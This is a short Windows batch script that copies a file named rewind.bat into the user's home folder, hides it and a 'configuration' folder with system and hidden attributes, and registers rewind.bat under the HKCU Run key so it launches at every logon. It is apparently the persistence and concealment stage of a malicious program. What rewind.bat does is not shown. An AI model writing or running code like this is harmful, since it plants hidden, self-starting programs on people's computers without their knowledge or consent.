@echo off


:rewind_2
IF EXIST "C:\Users\%USERNAME%\rewind.bat" (
	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
	goto end
) ELSE (
	COPY "C:\Users\%USERNAME%\configuration\rewind.bat" "C:\Users\%USERNAME%\"
	attrib +h "C:\Users\%USERNAME%\configuration" /s /d
	attrib +s +h "C:\Users\%USERNAME%\rewind.bat"
	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Rewind /t REG_SZ /d "C:\Users\%USERNAME%\rewind.bat" /f
	goto end
)

:end
exit /B 0
